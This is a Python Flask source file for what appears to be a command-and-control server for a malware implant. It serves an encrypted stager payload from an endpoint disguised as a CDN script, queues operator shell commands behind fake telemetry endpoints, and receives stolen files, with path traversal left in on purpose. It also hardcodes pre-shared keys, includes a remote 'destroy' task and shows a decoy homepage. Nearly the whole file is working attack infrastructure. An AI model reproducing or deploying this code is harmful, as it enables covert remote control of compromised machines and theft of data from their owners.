"""Command and Control HTTP server for communicating with implant"""

import base64
import os
import json
import time

from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization

app = Flask(__name__)
HOST = ""  # put your local ip here
PORT = 8443
tasks = []
results = []
UPLOAD_FOLDER = "uploads"
STAGER_ENDPOINT = "/cdn/bootstrap.js"
BEACON_ENDPOINT = "/api/telemetry"
RESULTS_ENDPOINT = "/api/updates"
FILE_ENDPOINT = "/api/upload"
derived_key = None


def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
    """Encrypt data using AES-256-GCM with nonce and encode with base64"""
    if isinstance(plaintext, str):
        plaintext = plaintext.encode("utf-8")

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ciphertext)


def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
    """Decrypt data using AES-256-GCM with nonce and decode with base64"""
    data = base64.b64decode(b64_data)
    nonce = data[:12]
    ciphertext_and_tag = data[12:]

    aesgcm = AESGCM(aes_key)
    plaintext = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
    return plaintext if not decode else plaintext.decode("utf-8")


def exchange_keys(client_public_bytes: bytes) -> bytes:
    """
    X25519 key exchange protocol:

    1.  On start, client generates key pair and sends public key in first beacon to server
    2.  Server generates key pair and responds to client with its public key
    3.  Both client and server derive shared secret AES key and use it for following communications
    -   These packets are encrypted with pre-shared key
    -   If client can't connect to server, it will keep retrying with new key pairs
    """
    print("[*] First beacon received from client, exchanging keys...")
    # get client public key
    client_public_key = x25519.X25519PublicKey.from_public_bytes(client_public_bytes)

    # generate X25519 keypair
    server_private_key = x25519.X25519PrivateKey.generate()
    server_public_key = server_private_key.public_key()

    # send public key bytes to client
    server_public_bytes = server_public_key.public_bytes(
        encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw
    )

    # compute shared secret
    shared_secret = server_private_key.exchange(client_public_key)

    # derive AES key using HKDF
    shared_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"handshake data",
    ).derive(shared_secret)

    # save key to disk for backup
    print("[*] Saving to 'cert/derived.key'...")
    with open("cert/derived.key", "wb") as f:
        f.write(shared_key)

    return shared_key, server_public_bytes


def restore_key() -> bytes:
    """
    If the C2 stops for any reason while the implant is still active, it will lose the derived AES
    key. This would effectively prevent it from communicating with the implant which expects
    encrypted messages, even for stopping the implant or getting a new key since only the client can
    initiate key exchange. If this happens, we attempt to recover it from the backup saved in
    "cert/derived.key"
    """
    # create "derived.key" if it doesn't exist
    if not os.path.exists("cert/derived.key"):
        print("[!] 'cert/derived.key' not found, creating empty file...")
        with open("cert/derived.key", "wb") as f:
            return

    print("[*] Restoring derived key from last session...")
    with open("cert/derived.key", "rb") as f:
        shared_key = f.read()
    return shared_key


@app.route(STAGER_ENDPOINT)
def send_encrypted_payload():
    """
    Attacker calls this from the target to download the encrypted payload
    Use pycryptodome here since target has it installed
    """
    # encrypt payload before sending if it doesnt exist
    if not os.path.exists("dist/encrypted_payload"):
        with open("dist/payload", "rb") as f:
            plain = f.read()

            pre_shared_key = b"Kg.\xe1\xfb\x8e\xf6\x81\xa2\xf0g\xd6\xfd\x00\x047\xd0m\xe3\xe7E@\x00\xb4=\xc7\xb4\xc4-\x87\x0c\x17"
            nonce = os.urandom(12)
            cipher = AES.new(pre_shared_key, AES.MODE_GCM, nonce=nonce)
            ciphertext, tag = cipher.encrypt_and_digest(plain)

            encrypted_payload = nonce + ciphertext + tag
            return encrypted_payload

    # else send encrypted payload
    with open("dist/encrypted_payload", "rb") as f:
        payload = f.read()
        return payload


@app.route(BEACON_ENDPOINT, methods=["POST"])
def beacon():
    """
    When implant requests this endpoint with no data, send its tasks
    If receiving client's first beacon with its public key, send server's public key
    """
    # client's first beacon with public key
    if request.data:
        pre_shared_key = b"]T\xb8\x9e\xc4*}F\x01\xa7\xa30P-Y\xb1\x87W\x07\xe9\xe3\x81\x95r\x11v\n\xf498=\x9f"
        enc = request.get_data()
        client_public_bytes = decrypt_data(pre_shared_key, enc, False)
        global derived_key
        derived_key, server_public_bytes = exchange_keys(client_public_bytes)

        # send server public bytes, then send tasks on the next beacon
        return encrypt_data(pre_shared_key, server_public_bytes)

    # else send task
    response = encrypt_data(derived_key, json.dumps({"tasks": tasks}))
    # clear after sending
    tasks.clear()
    return response


@app.route("/task", methods=["POST"])
def task():
    # operator calls this endpoint with "cmd" (str) param to add task
    # implant receives tasks when pinging BEACON_ENDPOINT
    # implant uploads results to RESULTS_ENDPOINT
    data = request.json
    print("[*] TASKS\n", data)
    command: str = data.get("cmd")

    tasks.append(command)
    return jsonify({"status": "task added"})


@app.route(RESULTS_ENDPOINT, methods=["POST"])
def task_result():
    # implant uses this endpoint to upload results of tasks
    enc = request.get_data().decode()
    plain = decrypt_data(derived_key, enc)
    json_data = json.loads(plain)
    print("[*] RESULT\n", json_data)

    result = json_data.get("result")
    results.append(result)
    return "", 200


@app.route("/exfil", methods=["POST"])
def queue_exfil():
    # operator calls this with "files" (list[str]) param to tell implant which files to exfiltrate
    # implant will respond to FILE_ENDPOINT
    data = request.json
    files = data.get("files")

    # allow inputting single files
    if isinstance(files, str):
        files = [files]
    # ensure files is list[str]
    if (not files or not isinstance(files, list)) or (
        files and not isinstance(files[0], str)
    ):
        return "[!] Request must include 'files' param as list[str]"

    for filename in files:
        # don't secure filename because we want file traversal
        tasks.append(f"FILE {filename}")

    return jsonify({"status": f"{len(files)} files added"})


@app.route(FILE_ENDPOINT, methods=["POST"])
def recv_file():
    # implant uses this endpoint to upload encrypted files in "files" field
    # decrypted files are uploaded in UPLOAD_FOLDER with a timestamp appended
    if "file" not in request.files:
        return "", 400

    enc_file = request.files.get("file")  # Flask FileStorage object
    # decrypt file
    file_bytes = decrypt_data(derived_key, enc_file.read(), False)

    # upload to UPLOAD_FOLDER/filename_<timestamp>
    filename = decrypt_data(derived_key, enc_file.filename)
    sec_filename = secure_filename(filename + f"_{int(time.time())}")
    with open(os.path.join(UPLOAD_FOLDER, sec_filename), "wb") as f:
        f.write(file_bytes)
    return "", 200


@app.route("/destroy", methods=["POST"])
def destroy():
    # operator calls this to replace all tasks with final "destroy" task
    tasks.clear()
    tasks.append("DESTROY")
    return jsonify({"status": "sent destroy task"})


@app.route("/view")
def view_results():
    """Operator calls this endpoint to view results"""
    return jsonify(results)


@app.route("/")
def show_homepage():
    return "<center><h1>totally legitimate app, nothing to see here\n</h1></center>"


if __name__ == "__main__":
    context = ("cert/server.crt", "cert/server.key")
    derived_key = restore_key()
    app.run(host=HOST, port=PORT, ssl_context=context)
